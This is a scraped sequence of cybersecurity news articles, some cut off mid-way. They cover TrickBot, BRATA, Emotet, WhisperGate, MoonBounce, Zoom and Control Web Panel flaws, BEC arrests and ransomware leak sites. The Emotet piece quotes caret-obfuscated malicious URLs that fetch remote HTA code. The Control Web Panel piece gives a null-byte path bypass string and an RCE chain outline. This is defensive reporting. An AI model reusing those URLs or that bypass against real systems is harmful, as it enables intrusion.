'text': 'The cybercrime operators behind the notorious TrickBot malware have once again upped the ante by fine-tuning its techniques by adding multiple layers of defense to slip past antimalware products.\n“As part of that escalation, malware injections have been fitted with added protection to keep researchers out and get through security controls,“ IBM Trusteer said in a report. “In most cases, these extra protections have been applied to injections used in the process of online banking fraud — TrickBot’s main activity since its inception after the Dyre Trojan’s demise.“\nTrickBot, which started out as a banking trojan, has evolved into a multi-purpose crimeware-as-a-service (CaaS) that’s employed by a variety of actors to deliver additional payloads such as ransomware. Over 100 variations of TrickBot have been identified to date, one of which is a “Trickboot“ module that can modify the UEFI firmware of a compromised device.\n\nIn the fall of 2020, Microsoft along with a handful of U.S. government agencies and private security companies teamed up to tackle the TrickBot botnet, taking down much of its infrastructure across the world in a bid to stymie its operations.\nBut TrickBot has proven to be impervious to takedown attempts, what with the operators quickly adjusting their techniques to propagate multi-stage malware through phishing and malspam attacks, not to mention expand their distribution channels by partnering with other affiliates like Shathak (aka TA551) to increase scale and drive profits.\n\nMore recently, malware campaigns involving Emotet have piggybacked on TrickBot as a “delivery service,“ triggering an infection chain that drops the Cobalt Strike post-exploitation tool directly onto compromised systems. As of December 2021, an estimated 140,000 victims across 149 countries have been infected by TrickBot.\nThe new updates observed by IBM Trusteer relate to the real-time web injections used to steal banking credentials and browser cookies. This works by steering victims to replica domains when attempting to navigate to a banking portal as part of what’s called a man-in-the-browser (MitB) attack.\nAlso put to use is a server-side injection mechanism that intercepts the response from a bank’s server and redirects it to an attacker-controlled server, which, in turn, inserts additional code into the webpage before it is relayed back to the client.\n\n“To facilitate fetching the right injection at the right moment, the resident TrickBot malware uses a downloader or a JavaScript (JS) loader to communicate with its inject server,“ said Michael Gal, a security web researcher at IBM.\nOther lines of defense adopted the latest version of TrickBot shows the use of encrypted HTTPS communications with the command-and-control (C2) server for fetching injections; an anti-debugging mechanism to thwart analysis; and new ways to obfuscate and hide the web inject, including the addition of redundant code and the incorporation of hex representation for initializing variables.\nSpecifically, upon detecting any attempt made to beautify the injected script, TrickBot’s anti-debugging feature triggers a memory overload that would crash the page, effectively preventing any examination of the malware.\n“The TrickBot Trojan and the gang that operates it have been a cyber crime staple since they took over when a predecessor, Dyre, went bust in 2016,“ Gal said. “TrickBot has not rested a day. Between takedown attempts and a global pandemic, it has been diversifying its monetization models and growing stronger.“\n\n\nFound this article interesting?

{'title': 'Mobile Banking Trojan BRATA Gains New, Dangerous Capabilities',
'text': 'The Android malware tracked as BRATA has been updated with new features that grants it the ability to record keystrokes, track device locations, and even perform a factory reset in an apparent bid to cover up fraudulent wire transfers.\nThe latest variants, detected late last year, are said to be distributed through a downloader to avoid being detected by security software, Italian cybersecurity firm Cleafy said in a technical write-up. Targets include banks and financial institutions in the U.K., Poland, Italy, and Latin America.\n\n“What makes Android RAT so interesting for attackers is its capability to operate directly on the victim devices instead of using a new device,“ Cleafy researchers noted in December 2021. “By doing so, Threat Actors (TAs) can drastically reduce the possibility of being flagged ’as suspicious’, since the device’s fingerprinting is already known to the bank.“\nFirst seen in the wild at the end of 2018 and short for “Brazilian Remote Access Tool Android,“ BRATA initially targeted users in Brazil and then rapidly evolved into a feature-packed banking trojan. Over the years, the malware has received numerous upgrades and changes, while also posing as security scanner apps to elude detection.\nBRATA is spread via smishing messages that impersonate a bank and contain a link to a malicious website, where the victim is tricked into downloading an anti-spam app. The scammers then call the target and employ social engineering schemes to persuade the user to install the trojan app and grant it overly-intrusive permissions.\n\nThe latest “tailored“ samples of BRATA set aim at different countries and constitute an initial dropper — a security app dubbed “iSecurity“ — that remains undetected by virtually all malware scanning engines and is used to download and execute the real malicious software.\n“After the victim installs the downloader app, it requires accepting just one permission to download and install the malicious application from an untrusted source,“ the researchers said. “When the victim clicks on the install button, the downloader app sends a GET request to the C2 server to download the malicious .APK.“\n\nBRATA, like other banking trojans observed in the wild, is known to abuse its Accessibility Service permissions obtained during the installation phase to monitor the user’s activity on the compromised device stealthily.\nFurthermore, the new versions have incorporated a kill switch mechanism that allows the operators to restore the Android phone to its factory settings upon successfully completing an illicit wire transfer or in scenarios where the application is installed in a virtual environment, effectively erasing forensic evidence of the attack’s origin and evading attempts to reverse-engineer its code.\n“BRATA is trying to reach out to new targets and to develop new features,“ the researchers said, adding threat actors are “leveraging this banking trojan for performing frauds, typically through unauthorized wire transfer (e.g., SEPA) or through Instant Payments, using a wide network of money mules accounts in multiple European countries.“\n\n\nFound this article interesting?

{'title': 'Hackers Using New Malware Packer DTPacker to Avoid Analysis, Detection',
'text': 'A previously undocumented malware packer named DTPacker has been observed distributing multiple remote access trojans (RATs) and information stealers such as Agent Tesla, Ave Maria, AsyncRAT, and FormBook to plunder information and facilitate follow-on attacks.\n“The malware uses multiple obfuscation techniques to evade antivirus, sandboxing, and analysis,“ enterprise security company Proofpoint said in an analysis published Monday. “It is likely distributed on underground forums.“ \n\nThe .NET-based commodity malware has been associated with dozens of campaigns and multiple threat groups, both advanced persistent threat (APT) and cybercrime actors, since 2020, with the intrusions aimed at hundreds of customers across many sectors.\nAttack chains involving the packer rely on phishing emails as an initial infection vector. The messages contain a malicious document or a compressed executable attachment, which, when opened, deploys the packer to launch the malware.\n\nPackers differ from downloaders in that unlike the latter, they carry an obfuscated payload to hide their true behavior from security solutions in a manner that acts as an “armor to protect the binary“ and make reverse engineering more difficult.\nWhat makes DTPacker different is that it functions as both. Its name is derived from the fact that it used two Donald Trump-themed fixed keys — “trump2020“ and “Trump2026“ — to decode the embedded or downloaded resource that ultimately extracts and executes the final payload.\n\nIt’s currently not known why the authors chose this specific reference to the former U.S. president as the malware is neither used to target politicians or political organizations nor are the keys seen by the targeted victims.\nProofpoint said it observed the operators making subtle changes by switching to using soccer fan club websites as decoys to host the malware from March 2021, with the packer employed by groups like TA2536 and TA2715 in their own campaigns a year before that.\n“DTPacker’s use as both a packer and downloader and its variation in delivery and obfuscation whilst keeping two such unique keys as part of its decoding is very unusual,“ said the researchers, who expect the malware to be used by multiple threat actors for the foreseeable future.\n\n\nFound this article interesting?

{'title': 'ZTNAs Address Requirements VPNs Cannot. Here’s Why.',
'text': 'I recently hopped on the Lookout podcast to talk about virtual private networks (VPNs) and how they’ve been extended beyond their original use case of connecting remote laptops to your corporate network. Even in this new world where people are using personal devices and cloud apps, VPN continues to be the go-to solution for remote access and cloud access. After my conversation with Hank Schless, I was inspired to put some additional thoughts about VPN on paper.\nWhen most organizations were forced to shift to remote work last year, they needed a quick-fix solution that would enable their remote employees to access work resources securely. For many, this solution came in the form of VPNs. However, VPNs were not designed for the bring your own device (BYOD) and cloud app use cases.\nWhile VPNs are able to provide remote access, it may come as a surprise that they fall short when it comes to security. This is because VPNs were built for when only a small portion of your workforce wanted to work from home. They also place too much trust on the device and the user. But now, as work from anywhere continues, it is important to rethink how to provide access for your entire organization in a secure manner.My colleague, Joel Perkins, Director of IT Systems Engineering recently took the time to distill Lookout’s SASE journey into best practices that every organization can apply and touches on our experiences with VPN. Watch on-demand here.\nWhat are the challenges of a remote-first workforce?\nWhen they first debuted twenty years ago, VPNs were the de-facto method for connecting remote workers to an organization’s data center when laptops became common. Back then, computers still used modems and services like iPass for connectivity. A VPN ran over top of services like iPass to create a “private network“ and keep the transmission secure.\nBut since then, the technological landscape has changed dramatically. In several ways, they were built to solve yesterday’s problems.\nNow, the widespread adoption of cloud applications means the way we store and access work data is completely different. On any given day, I’ll connect to an internal development system, access documents on Google Workspace, send Slack messages to coworkers and use Zoom to attend meetings. I can perform all of these equally easily on my smartphone and my laptop.\nMany Lookout customers may have a similar experience that also includes accessing applications on AWS or Azure, such as SAP S/4HANA. As we work remotely, we’ve become accustomed to seamlessly accessing what we need wherever it is and to work from any device of our choosing.\nAnother significant challenge brought on by this new environment is that organizations do not have the required visibility into their complex IT environments.\nUnlike back in the day, where you’d only be using work-issued devices on company-managed networks, employees are accessing work resources using devices, networks and software that your IT team has no control over or may even be unaware of. This has significantly increased the attack surface of your organization.\nWhy are VPNs inadequate for the modern work environment?\nOne of the biggest issues with VPNs is that they provide full network access to whoever and whatever is connected. And it’s not just the device connected, everything that’s on that device’s network is also given access. So whether it’s a piece of malware, or a compromised account, there’s nothing to stop them from moving laterally across your infrastructure and causing harm.\nVPNs also have a bad track record when it comes to user experience. When direct access to the cloud is available everywhere, expecting your employees to first sign into a VPN to go to these cloud applications puts a road bump into their workflows. Think of it like forcing someone to travel from Boston to New York City via Los Angeles — inefficient. If you’ve ever experienced slow page loading times or snail-paced downloads while on a VPN, then it is likely due to your traffic being forced to take an inefficient route.\nWhat’s the alternative?\nTo address these new problems and for the reasons discussed above, VPNs don’t cut it when it comes to giving your remote workers secure access to what they need. Secure access technologies like Zero Trust network access (ZTNA) or cloud access security broker (CASB) pick up where VPNs leave off.\nThese secure access service edge (SASE) technologies give granular access to only the applications and data that your workers need while continuously monitoring user and device behavior to adjust access based on risk dynamically. This means that the risk of lateral movement is dramatically reduced, the connectivity between the user and the app is efficient, and the security of the connection goes well beyond encrypting traffic between two points.\nZTNA provides seamless connection to your apps without putting your data at risk\nAfter all these years of connecting your workers to your organization, they deserve their praise where it’s due. But the problems they were made to address back then are no longer relevant. Your organization is now facing the challenge of enabling your workers with the freedom and flexibility to work with applications in the cloud from anywhere while safeguarding your data. Moving away from technology like VPNs to next-generation alternatives like ZTNA is a good start.\nLearn how you can augment your VPN deployment and safeguard your organization by checking out the Lookout Secure Access Service Edge solution.Note — This article is written and contributed by Sundaram Lakshmanan, CTO of SASE Products.\n\n\nFound this article interesting?

'text': 'Misconfigurations in smart contracts are being exploited by scammers to create malicious cryptocurrency tokens with the goal of stealing funds from unsuspecting users.\nThe instances of token fraud in the wild include hiding 99% fee functions and concealing backdoor routines, researchers from Check Point said in a report shared with The Hacker News.\nSmart contracts are programs stored on the blockchain that are automatically executed when predetermined conditions are met according to the terms of a contract or an agreement. They allow trusted transactions and agreements to be carried out between anonymous parties without the need for a central authority.\n\nBy examining the Solidity source code used for implementing smart contracts, the Israeli cybersecurity company found instances of hidden and hardcoded fees that can’t be changed, while allowing malicious actors to exert control over “who is allowed to sell.“\nIn another instance, a legitimate contract called Levyathan was hacked after its developers inadvertently uploaded the wallet’s private key to their GitHub repository, enabling the exploiter to mint an infinite number of tokens and steal funds from the contract in July 2021.\n\nA rug pull is a type of scam that happens when the creators cash out out the investors’ money and abandon the project after a huge amount is allocated to what appears to be a legitimate crypto project.\nLastly, poor access controls put in place by the maintainers of the Zenon Network allowed an attacker to abuse the unprotected burn function within the smart contract to ramp up the price of the coin and drain funds to the tune of $814,570 in November 2021.\n\nThe findings come as cyberattack campaigns have been observed leveraging phishing schemes built on lures surrounding soon-to-be-released (albeit fake) crypto tokens to ultimately trick victims into paying for it with their own cryptocurrency.\n“On top of that, to engage other victims and perpetuate the scam, the website offered a referral program for friends and family,“ Akamai researcher Or Katz said. “In doing this, the threat actors created a new trustworthy channel through which current victims referred [to] other potential targets.“\nIn a related development, blockchain security companies Elliptic and PeckShield revealed details of an unresolved flaw in NFT marketplace OpenSea that’s being exploited by unscrupulous parties to purchase valuable non-fungible tokens (NFTs) at a much lower price than their current market value and sell them at a profit.\n“The implication is that crypto users will continue to fall into these traps, and will lose their money,“ Oded Vanunu, head of products vulnerabilities research at Check Point, said. “To avoid scam coins, I recommend crypto users to diversify their wallets, ignore ads, and test their transactions.“\n\n\nFound this article interesting?

'text': 'Social engineering campaigns involving the deployment of the Emotet malware botnet have been observed using “unconventional“ IP address formats for the first time in a bid to sidestep detection by security solutions.\nThis involves the use of hexadecimal and octal representations of the IP address that, when processed by the underlying operating systems, get automatically converted “to the dotted decimal quad representation to initiate the request from the remote servers,“ Trend Micro’s Threat Analyst, Ian Kenefick, said in a report Friday.\n\nThe infection chains, as with previous Emotet-related attacks, aim to trick users into enabling document macros and automate malware execution. The document uses Excel 4.0 Macros, a feature that has been repeatedly abused by malicious actors to deliver malware.\nOnce enabled, the macro invokes a URL that’s obfuscated with carets, with the host incorporating a hexadecimal representation of the IP address — “h^tt^p^:/^/0xc12a24f5/cc.html“ — to execute an HTML application (HTA) code from the remote host.\n\nA second variant of the phishing attack follows the same modus operandi, the only difference being that the IP address is now coded in the octal format — “h^tt^p^:/^/0056.0151.0121.0114/c.html“.\n“The unconventional use of hexadecimal and octal IP addresses may result in evading current solutions reliant on pattern matching,“ Kenefick said. “Evasion techniques like these could be considered evidence of attackers continuing to innovate to thwart pattern-based detection solutions.“\n\nThe development comes amid renewed Emotet activity late last year following a 10-month-long hiatus in the wake of a coordinated law enforcement operation to disrupt the botnet. In December 2021, researchers uncovered evidence of the malware evolving its tactics to drop Cobalt Strike Beacons directly onto compromised systems.\nThe findings also arrive as Microsoft revealed plans to disable Excel 4.0 (XLM) Macros by default to safeguard customers against security threats. “This setting now defaults to Excel 4.0 (XLM) macros being disabled in Excel (Build 16.0.14427.10000),“ the company announced last week.\n\n\nFound this article interesting?

'text': 'The maintainers of the Rust programming language have released a security update for a high-severity vulnerability that could be abused by a malicious party to purge files and directories from a vulnerable system in an unauthorized manner.\n“An attacker could use this security issue to trick a privileged program into deleting files and directories the attacker couldn’t otherwise access or delete,“ the Rust Security Response working group (WG) said in an advisory published on January 20, 2021.\n\nRust 1.0.0 through Rust 1.58.0 is affected by this vulnerability. The flaw, which is tracked as CVE-2022-21658 (CVSS score: 7.3), has been credited to security researcher Hans Kratz, with the team pushing out a fix in Rust version 1.58.1 shipped last week.\nSpecifically, the issue stems from an improperly implemented check to prevent recursive deletion of symbolic links (aka symlinks) in a standard library function named “std::fs::remove_dir_all.“ This results in a race condition, which, in turn, could be reliably exploited by an adversary by abusing their access to a privileged program to delete sensitive directories.\n\n“Instead of telling the system not to follow symlinks, the standard library first checked whether the thing it was about to delete was a symlink, and otherwise it would proceed to recursively delete the directory,“ the advisory said. “This exposed a race condition: an attacker could create a directory and replace it with a symlink between the check and the actual deletion.“\nRust, while not a widely-used programming language, has witnessed a surge in adoption in recent years for its memory-related safety guarantees. Last year, Google announced that its open-source version of the Android operating system will add support for the programming language to prevent memory safety bugs.\n\n\nFound this article interesting?

'text': 'Latest analysis into the wiper malware that targeted dozens of Ukrainian agencies earlier this month has revealed “strategic similarities“ to NotPetya malware that was unleashed against the country’s infrastructure and elsewhere in 2017.\nThe malware, dubbed WhisperGate, was discovered by Microsoft last week, which said it observed the destructive cyber campaign targeting government, non-profit, and information technology entities in the nation, attributing the intrusions to an emerging threat cluster codenamed “DEV-0586.“\n\n“While WhisperGate has some strategic similarities to the notorious NotPetya wiper that attacked Ukranian entities in 2017, including masquerading as ransomware and targeting and destroying the master boot record (MBR) instead of encrypting it, it notably has more components designed to inflict additional damage,“ Cisco Talos said in a report detailing its response efforts.\nStating that stolen credentials were likely used in the attack, the cybersecurity company also pointed out that the threat actor had access to some of the victim networks months in advance before the infiltrations took place, a classic sign of sophisticated APT attacks.\n\nThe WhisperGate infection chain is fashioned as a multi-stage process that downloads a payload that wipes the master boot record (MBR), then downloads a malicious DLL file hosted on a Discord server, which drops and executes another wiper payload that irrevocably destroys files by overwriting their content with fixed data on the infected hosts. \nThe findings come a week after roughly 80 Ukrainian government agencies’ websites were defaced, with the Ukrainian intelligence agencies confirming that the twin incidents are part of a wave of malicious activities targeting its critical infrastructure, while also noting that the attacks leveraged the recently disclosed Log4j vulnerabilities to gain access to some of the compromised systems.\n\n“Russia is using the country as a cyberwar testing ground — a laboratory for perfecting new forms of global online combat,“ Wired’s Andy Greenberg noted in a 2017 deep-dive about the attacks that took aim at its power grid in late 2015 and caused unprecedented blackouts.\n“Systems in Ukraine face challenges that may not apply to those in other regions of the world, and extra protections and precautionary measures need to be applied,“ Talos researchers said. “Making sure those systems are both patched and hardened is of the utmost importance to help mitigate the threats the region faces.“\n\n\nFound this article interesting?

Additionally, it necessitates that a clean version of WordPress is deployed to revert the modifications done during the installation of the backdoor.\nThe findings also come as WordPress security company Wordfence disclosed details of a now-patched cross-site scripting (XSS) vulnerability impacting a plugin called “WordPress Email Template Designer – WP HTML Mail“ that’s installed on over 20,000 websites.\nTracked as CVE-2022-0218, the bug has been rated 8.3 on the CVSS vulnerability scoring system and has been addressed as part of updates released on January 13, 2022 (version 3.1).\n\n“This flaw made it possible for an unauthenticated attacker to inject malicious JavaScript that would execute whenever a site administrator accessed the template editor,“ Chloe Chamberland said. “This vulnerability would also allow them to modify the email template to contain arbitrary data that could be used to perform a phishing attack against anyone who received emails from the compromised site.“\nAccording to statistics published by Risk Based Security this month, a whopping 2,240 security flaws were discovered and reported in third-party WordPress plugins towards the end of 2021, up 142% from 2020, when nearly 1,000 vulnerabilities were disclosed. To date, a total of 10,359 WordPress plugin vulnerabilities have been uncovered.\n\n\nFound this article interesting?

'text': 'Researchers have disclosed details of two critical security vulnerabilities in Control Web Panel that could be abused as part of an exploit chain to achieve pre-authenticated remote code execution on affected servers.\nTracked as CVE-2021-45467, the issue concerns a case of a file inclusion vulnerability, which occurs when a web application is tricked into exposing or running arbitrary files on the web server.\nControl Web Panel, previously CentOS Web Panel, is an open-source Linux control panel software used for deploying web hosting environments.\n\nSpecifically, the issue arises when two of the unauthenticated PHP pages used in the application — “/user/login.php“ and “/user/index.php“ — fail to adequately validate a path to a script file, according to Octagon Networks’ Paulos Yibelo, who discovered and reported the flaws.\nThis means that in order to exploit the vulnerability, all an attacker has to do is to alter the include statement, which is used to include the content of one PHP file into another PHP file, to inject malicious code from a remote resource and achieve code execution.\n\nInterestingly, while the application had protections in place to flag efforts to switch to a parent directory (denoted by “..“) as a “hacking attempt“ it did nothing to prevent the PHP interpreter from accepting a specially crafted string such as “.$00.“ and effectively achieving a full bypass.\n\nThis not only allows a bad actor to access restricted API endpoints, it can be used in conjunction with an arbitrary file write vulnerability (CVE-2021-45466) to gain full remote code execution on the server as follows —\nSend a null byte powered file inclusion payload to add malicious API keyUse API key to write to a file (CVE-2021-45466)Use step #1 to include the file we just wrote into (CVE-2021-45467)\nFollowing responsible disclosure, the flaws have since been addressed by the CWP maintainers along with updates shipped earlier this month.\n\n\nFound this article interesting?

{'title': 'Chinese Hackers Spotted Using New UEFI Firmware Implant in Targeted Attacks',
'text': 'A previously undocumented firmware implant deployed to maintain stealthy persistence as part of a targeted espionage campaign has been linked to the Chinese-speaking Winnti advanced persistent threat group (APT41).\nKaspersky, which codenamed the rootkit MoonBounce, characterized the malware as the “most advanced UEFI firmware implant discovered in the wild to date,“ adding “the purpose of the implant is to facilitate the deployment of user-mode malware that stages execution of further payloads downloaded from the internet.“\nFirmware-based rootkits, once a rarity in the threat landscape, are fast becoming lucrative tools among sophisticated actors to help achieve long standing foothold in a manner that’s not only hard to detect, but also difficult to remove.\n\nThe first firmware-level rootkit — dubbed LoJax — was discovered in the wild in 2018. Since then, three different instances of UEFI malware have been unearthed so far, including MosaicRegressor, FinFisher, and ESPecter.\n\nMoonBounce is concerning for a number of reasons. Unlike FinFisher and ESPecter, which take aim at the EFI System Partition (ESP), the newly discovered rootkit — along the likes of LoJax and MosaicRegressor — targets the SPI flash, a non-volatile storage external to the hard drive.\n\nBy emplacing such highly persistent bootkit malware within the flash storage that’s soldered to a computer’s motherboard, the mechanism makes it impossible to get rid of via hard drive replacement and even resistant to re-installation of the operating system.\nThe Russian cybersecurity company said it identified the presence of the firmware rootkit in a single incident last year, indicative of the highly targeted nature of the attack. That said, the exact mechanism by which the UEFI firmware was infected remains unclear.\n\nAdding to its stealthiness is the fact that an existing firmware component was tampered to alter its behaviour — rather than adding a new driver to the image — with the goal of diverting the execution flow of the boot sequence to a malicious attack sequence that injects the user-mode malware during system startup, which then reaches out to a hardcoded remote server to retrieve the next-stage payload.\n“The infection chain itself does not leave any traces on the hard drive, as its components operate in memory only, thus facilitating a fileless attack with a small footprint,“ the researchers noted, adding that it uncovered other non-UEFI implants in the targeted network communicating with the same infrastructure that hosted the staging payload.\n\nChief among those components deployed across multiple nodes in the network include a backdoor tracked as ScrambleCross (aka Crosswalk) and a number of post-exploitation malware implants like Microcin and Mimikat_ssp, suggesting that the attackers performed lateral movement after gaining an initial access in order to exfiltrate data from specific machines.\nCybersecurity firm Binarly, in an independent analysis, noted that the MoonBounce UEFI component was built for a target hardware related to a MSI system from 2014, and that the malware could have been delivered to the compromised machine either via physical access or through software modifications resulting from a lack of adequate SPI protections.\nTo counter such firmware-level modifications, it’s recommended to regularly update the UEFI firmware as well as enable protections such as Boot Guard, Secure boot, and Trust Platform Modules (TPM).\n“MoonBounce marks a particular evolution in this group of threats by presenting a more complicated attack flow in comparison to its predecessors and a higher level of technical competence by its authors, who demonstrate a thorough understanding of the finer details involved in the UEFI boot process,“ the researchers said.\n\n\nFound this article interesting?

'text': 'An exploration of zero-click attack surface for the popular video conferencing solution Zoom has yielded two previously undisclosed security vulnerabilities that could have been exploited to crash the service, execute malicious code, and even leak arbitrary areas of its memory.\nNatalie Silvanovich of Google Project Zero, who discovered and reported the two flaws last year, said the issues impacted both Zoom clients and Multimedia Router (MMR) servers, which transmit audio and video content between clients in on-premise deployments.\nThe weaknesses have since been addressed by Zoom as part of updates shipped on November 24, 2021.\nThe goal of a zero-click attack is to stealthily gain control over the victim’s device without requiring any kind of interaction from the user, such as clicking on a link.\n\nWhile the specifics of the exploit will vary depending on the nature of vulnerability being exploited, a key trait of zero-click hacks is their ability not to leave behind traces of malicious activity, making them very difficult to detect.\nThe two flaws identified by Project Zero are as follows —\nCVE-2021-34423 (CVSS score: 9.8) – A buffer overflow vulnerability that can be leveraged to crash the service or application, or execute arbitrary code.CVE-2021-34424 (CVSS score: 7.5) – A process memory exposure flaw that could be used to potentially gain insight into arbitrary areas of the product’s memory.\nBy analyzing the RTP (Real-time Transport Protocol) traffic used to deliver audio and video over IP networks, Silvanovich found that it’s possible to manipulate the contents of a buffer that supports reading different data types by sending a malformed chat message, causing the client and the MMR server to crash.\nFurthermore, the lack of a NULL check — which is used to determine the end of a string — made it possible to leak data from the memory when joining a Zoom meeting via a web browser.\n\nThe researcher also attributed the memory corruption flaw to the fact that Zoom failed to enable ASLR, aka address space layout randomization, a security mechanism designed to increase the difficulty of performing buffer overflow attacks.\n“The lack of ASLR in the Zoom MMR process greatly increased the risk that an attacker could compromise it,“ Silvanovich said. “ASLR is arguably the most important mitigation in preventing exploitation of memory corruption, and most other mitigations rely on it on some level to be effective. There is no good reason for it to be disabled in the vast majority of software.“\nWhile most video conferencing systems use open-source libraries such as WebRTC or PJSIP for implementing multimedia communications, Project Zero called out Zoom’s use of proprietary formats and protocols as well as its high licensing fees (nearly $1,500) as barriers to security research.\n“Closed-source software presents unique security challenges, and Zoom could do more to make their platform accessible to security researchers and others who wish to evaluate it,“ Silvanovich said. “While the Zoom Security Team helped me access and configure server software, it is not clear that support is available to other researchers, and licensing the software was still expensive.“\n\n\nFound this article interesting?

'text': 'A coordinated law enforcement operation has resulted in the arrest of 11 members allegedly belonging to a Nigerian cybercrime gang notorious for perpetrating business email compromise (BEC) attacks targeting more than 50,000 victims in recent years.\nThe disruption of the BEC network is the result of a ten-day investigation dubbed Operation Falcon II undertaken by the Interpol along with participation from the Nigeria Police Force’s Cybercrime Police Unit in December 2021.\nCybersecurity firms Group-IB and Palo Alto Networks’ Unit 42, both of which shared information on the threat actors and their infrastructure, said six of the 11 suspects are believed to be a part of a prolific group of Nigerian cyber actors known as SilverTerrier (aka TMT).\n\nBEC attacks, which began to gain dominance in 2013, are sophisticated scams that target legitimate business email accounts through social engineering schemes to infiltrate corporate networks and subsequently leverage their access to initiate or redirect the transfer of business funds to attacker-controlled bank accounts for personal gain.\n“One of the arrested suspects was in possession of more than 800,000 potential victim domain credentials on his laptop,“ Interpol said in a statement. “Another suspect had been monitoring conversations between 16 companies and their clients and diverting funds to ’SilverTerrier’ whenever company transactions were about to be made.“\nSilverTerrier has been linked to 540 distinct clusters of activity to date, with the collective increasingly adopting remote access trojans and malware packaged as Microsoft Office documents to mount their attacks. Unit 42, in a report published in October 2021, said it identified over 170,700 samples of malware directly attributed to Nigerian BEC actors since 2014.\n\nThe latest arrests constitute the second edition of Operation Falcon, the first of which resulted in the apprehension of three alleged members of the SilverTerrier gang in November 2020 for compromising at least 500,000 government and private sector companies in more than 150 countries since 2017.\n“BEC remains the most common and most costly threat facing our customers,“ Unit 42 researchers said. “Over half a decade, global losses have ballooned from $360 million in 2016 to a staggering $1.8 billion in 2020.“\nTo mitigate such financial attacks, it’s recommended for organizations to review network security policies, periodically audit mail server configurations, employee mail settings, and conduct employee training to ensure that wire transfer requests are validated using “verified and established points of contact for suppliers, vendors and partners.“\n\n\nFound this article interesting?

{'title': 'DoNot Hacking Team Targeting Government and Military Entities in South Asia',
'text': 'A threat actor with potential links to an Indian cybersecurity company has been nothing if remarkably persistent in its attacks against military organizations based in South Asia, including Bangladesh, Nepal, and Sri Lanka, since at least September 2020 by deploying different variants of its bespoke malware framework.\nSlovak cybersecurity firm ESET attributed the highly targeted attack to a hacking group known as Donot Team. “Donot Team has been consistently targeting the same entities with waves of spear-phishing emails with malicious attachments every two to four months,“ researchers Facundo Muñoz and Matías Porolli said.\n\nOperating since at least 2016, Donot Team (also known as APT-C-35 and SectorE02) has been linked to a string of intrusions primarily targeting embassies, governments, and military entities in Bangladesh, Sri Lanka, Pakistan, and Nepal with Windows and Android malware.\nIn October 2021, Amnesty International unearthed evidence tying the group’s attack infrastructure to an Indian cybersecurity company called Innefu Labs, raising suspicions that the threat actor may be selling the spyware or offering a hackers-for-hire service to governments of the region.\n\nWhile it’s not uncommon for APT groups to re-attack a previously compromised network by deploying stealthier backdoors to cover up their tracks, Donot Team tries a different tack in that it deploys multiple variants of the malware already in its arsenal.\nDelivered via weaponized Microsoft Office documents, the so-called yty malware framework is a chain of intermediary downloaders that culminates in the execution of a backdoor, which takes care of retrieving additional components capable of harvesting files, recording keystrokes and screenshots, and deploying reverse shells for remote access.\n\nESET dubbed the new variants of yty, DarkMusical and Gedit, with telemetry data pointing to attacks from a third variant called Jaca from March to July 2021. The first wave of attacks using DarkMusical is said to have occurred in June 2021, while Gedit-related campaigns were observed as early as September 2020, only to pick up the pace a year later.\nWhat’s more, a fourth set of attacks that happened between February and March 2021 targeting military organizations in Bangladesh and Sri Lanka leveraged a modified version of Gedit codenamed Henos.\n“Donot Team makes up for its low sophistication with tenacity,“ the researchers concluded. “We expect that it will continue to push on regardless of its many setbacks.

{'title': 'A Trip to the Dark Site — Leak Sites Analyzed',
'text': 'Gone are the days when ransomware operators were happy with encrypting files on-site and more or less discretely charged their victims money for a decryption key. What we commonly find now is encryption with the additional threat of leaking stolen data, generally called Double-Extortion (or, as we like to call it: Cyber Extortion or Cy-X). This is a unique form of cybercrime in that we can observe and analyze some of the criminal action via ’victim shaming’ leak sites.\nSince January 2020, we have applied ourselves to identifying as many of these sites as possible to record and document the victims who feature on them. Adding our own research, analyzing, and enriching data scraped from the various Cy-X operators and market sites, we can provide direct insights into the victimology from this specific perspective.\nWe must be clear that what we are analyzing is a limited perspective on the crime. Nevertheless, the data gleaned from an analysis of the leak-threats proves to be extremely instructive.\nWe’ll refer to the listing of a compromised organization on a Cy-X leak site as a ’leak threat’. The numbers you’ll see in most of the charts below refer to counts of such individual threats on the onion sites of the Cy-X groups we’ve been able to identify and track over the last two years.\nA boom in leak threats\nDespite the vagaries of the environment we’re observing, the number of unique leaks serves as reliable proxy for the scale of this crime, and its general trends over time. We observed an almost six-fold increase in leak-threats from the first quarter of 2020 to the third quarter of 2021.\nSource: Orange Cyberdefense Security Navigator 2022\nStriking where the money is: Leak threats by country\nLet’s take a look at the countries the victims operate in. \nSource: Orange Cyberdefense Security Navigator 2022\nIn the chart above we show the 2020 and 2021 leak threat counts per country, for the top 10 countries featured in our data set. We also show the estimated Gross Domestic Product (GDP) for the 12 wealthiest countries[1].\nThe top victim countries have remained relatively constant across our data set. As a general rule of thumb, the ranking of a country in our data set tracks the relative GDP of that country. The bigger the economy of a country, the more victims it is likely to have. Indeed, eight of the top ten Cy-X victim countries are among the top 10 economies in the world.\nThe conclusion we draw from this, is that the relative number of victims in a country is simply a function of the number of online businesses in that country. This does not prove definitively that Cy-X actors do not deliberately attack targets in specific countries or regions from time to time. It’s also not to say that a business in a high-GDP country is more likely to be attacked than a victim in a low-GDP country (since, with more businesses exposed within that country, the probabilities even out).\nIn our view, the take-away from this data is simply that businesses in almost every country are being compromised and extorted. Logically, the more businesses a country has, the more victims we will see.\nExceptions to the rule\nHaving said that, we’ve taken the liberty of including India, Japan, China and Russia in the chart above, as counterexamples of large-GDP countries that rank low on our Cy-X victims list.\nIndia, with a projected 2021 GDP of $ 2.72 trillion, and China with $ 13.4 trillion, appear underrepresented, which might be due to several reasons. India, for example, has a huge population and correspondingly large GDP, but the GDP per capita is lower, and the economy generally appears less modernized and digital, meaning fewer online businesses to target. It could be that criminals doubt that Indian businesses could or would pay their dollar-based ransoms. The language might also play a role – businesses that don’t communicate in English are more difficult to locate, understand, navigate, and negotiate with, and their users are harder to exploit using commoditized social engineering tools.\nJapan, as another obvious exception to our rule, has a highly modernized economy, but will present criminals with the same language and culture barriers as China and India, thus possibly accounting for the low prevalence in our victim data.\nThe conclusion here is that Cy-X is moving from English to non-English economies, but slowly for the time being. This is probably the logical result of the growing demand for victims fueled by new actors, but it might also be the consequence of increased political signaling from the USA, which may be making actors more cautious about who they and their affiliates exploit.\nRegardless of the reasons, the conclusion here once again needs to be that victims are found in almost every country, and countries who have hitherto appeared relatively unaffected cannot hope that this will remain the case.\nOne size fits all: No evidence of ’big game hunting’\nIn the chart below we show the number of victims by business size in our data set mapped to the top 5 actors. We define organization sizes as small (1000 or less employees), medium (1000-10,000) and large (10,000+).\nSource: Orange Cyberdefense Security Navigator 2022\nAs shown, businesses with less than 1,000 employees are compromised and threatened most often, with almost 75% of all leaks originating from them. 